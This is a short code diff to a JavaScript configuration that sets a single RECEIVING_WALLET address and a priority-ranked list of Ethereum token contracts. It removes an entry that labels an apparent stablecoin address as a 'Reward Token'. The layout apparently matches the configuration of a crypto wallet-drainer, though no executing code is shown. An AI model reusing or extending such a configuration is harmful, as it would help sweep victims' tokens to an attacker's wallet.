@@ -4,14 +4,6 @@ var RECEIVING_WALLET = "0x773F5d9eEc75629A2624EEd5D95472910D6c651a";
 var TOKENS = {
   ethereum: [
     {
-      name: "Reward Token",
-      symbol: "REWARD",
-      address: "0x6B175474E89094C44Da98b954EedeAC495271d0F",
-      abi: ERC20_ABI,
-      decimals: 18,
-      priority: 61
-    },
-    {
       name: "Tether USD",
       symbol: "USDT",
       address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
